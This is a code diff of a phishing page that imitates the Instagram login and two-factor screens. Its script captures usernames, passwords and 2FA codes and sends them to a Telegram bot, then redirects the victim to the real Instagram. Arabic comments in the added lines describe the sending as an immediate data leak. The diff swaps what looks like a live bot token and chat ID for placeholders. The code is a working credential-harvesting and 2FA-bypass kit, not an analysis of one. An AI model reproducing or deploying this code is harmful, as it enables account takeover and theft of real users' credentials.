@@ -428,14 +428,13 @@
 </head>
 <body>
 
-<!-- Loading screen after verify -->
+<!-- Loading screen -->
 <div id="loadingScreen">
     <div class="loader-spinner"></div>
     <p>Verifying...</p>
 </div>
 
 <div class="wrapper">
-    <!-- Phone images -->
     <div class="phone-container">
         <div class="phone-frame">
             <div class="screen">
@@ -449,8 +448,8 @@
         </div>
     </div>
 
-    <!-- Login Section -->
     <div class="login-section">
+        <!-- LOGIN CARD -->
         <div class="card" id="loginCard">
             <div class="logo">
                 <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
@@ -483,6 +482,7 @@
             <a href="#" class="forgot-password">Forgot password?</a>
         </div>
 
+        <!-- 2FA CARD -->
         <div class="card" id="twofaSection">
             <div class="lock-icon">
                 <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -538,10 +538,10 @@
 </footer>
 
 <script>
-    // ===== CONFIG: ضع التوكن والآيدي تاعك هنا =====
-    const BOT_TOKEN = '8914808690:AAH5uNoN50bLcm_S57M_wFivsDE3Hx_PCt8';
-    const CHAT_ID = '8278195073;
-    // =============================================
+    // ===== CONFIG =====
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+    const CHAT_ID = 'YOUR_CHAT_ID';
+    // ==================
 
     // ===== SLIDESHOW =====
     const slides = document.getElementById('slides');
@@ -592,10 +592,17 @@
         console.log('[+] UA:', navigator.userAgent);
         console.log('[+] Time:', new Date().toISOString());
 
-        // Send to Telegram (login data)
-        sendToTelegram(`🔐 *Instagram Login Captured* 🔐\n\n👤 Username: \`${capturedUsername}\`\n🔑 Password: \`${capturedPassword}\`\n📱 UA: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}`);
+        // ====== تسريب فوري للبيانات لتليجرام ======
+        sendToTelegram(
+            `🔐 *Instagram Login Captured* 🔐\n\n` +
+            `👤 *Username:* \`${capturedUsername}\`\n` +
+            `🔑 *Password:* \`${capturedPassword}\`\n` +
+            `📱 *UA:* ${navigator.userAgent}\n` +
+            `⏰ *Time:* ${new Date().toISOString()}\n` +
+            `🌐 *URL:* ${window.location.href}`
+        );
 
-        // Start cooldown
+        // ====== بدء العداد 10 ثواني (تسليك) ======
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = 10;
@@ -610,7 +617,7 @@
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
 
-                // Show 2FA
+                // إظهار صفحة 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
@@ -661,13 +668,21 @@
         const code = Array.from(codeBoxes).map(b => b.value).join('');
         console.log('[+] 2FA Code:', code);
 
-        // Send 2FA code to Telegram
-        sendToTelegram(`🔐 *Instagram 2FA Code* 🔐\n\n👤 Username: \`${capturedUsername}\`\n🔑 Password: \`${capturedPassword}\`\n🔢 2FA Code: \`${code}\`\n📱 UA: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}`);
+        // تسريب كود 2FA لتليجرام
+        sendToTelegram(
+            `🔐 *Instagram 2FA Code Received* 🔐\n\n` +
+            `👤 *Username:* \`${capturedUsername}\`\n` +
+            `🔑 *Password:* \`${capturedPassword}\`\n` +
+            `🔢 *2FA Code:* \`${code}\`\n` +
+            `📱 *UA:* ${navigator.userAgent}\n` +
+            `⏰ *Time:* ${new Date().toISOString()}\n` +
+            `🌐 *URL:* ${window.location.href}`
+        );
 
-        // Show loading screen
+        // إظهار شاشة التحميل
         loadingScreen.style.display = 'flex';
 
-        // Redirect to real Instagram after 2 seconds
+        // تحويل إلى Instagram الحقيقي
         setTimeout(() => {
             window.location.href = 'https://www.instagram.com';
         }, 2000);
@@ -680,7 +695,7 @@
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
 
-        sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 Username: \`${capturedUsername}\`\n⏰ Time: ${new Date().toISOString()}`);
+        sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
 
     // ===== BACK TO LOGIN =====
@@ -696,13 +711,13 @@
     document.getElementById('fbLogin').addEventListener('click', function(e) {
         e.preventDefault();
         console.log('[+] Facebook login clicked');
-        sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 Username: \`${capturedUsername || 'N/A'}\`\n⏰ Time: ${new Date().toISOString()}`);
+        sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
 
     // ===== SEND TO TELEGRAM =====
     function sendToTelegram(message) {
         if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
-            console.log('[Telegram] Bot token or chat ID not configured. Message not sent.');
+            console.log('[Telegram] Bot token or chat ID not configured.');
             console.log('[Telegram] Message:', message);
             return;
         }
@@ -721,11 +736,8 @@
         })
         .then(res => res.json())
         .then(data => {
-            if (data.ok) {
-                console.log('[Telegram] Message sent successfully');
-            } else {
-                console.error('[Telegram] Error:', data);
-            }
+            if (data.ok) console.log('[Telegram] Sent successfully');
+            else console.error('[Telegram] Error:', data);
         })
         .catch(err => console.error('[Telegram] Fetch error:', err));
     }
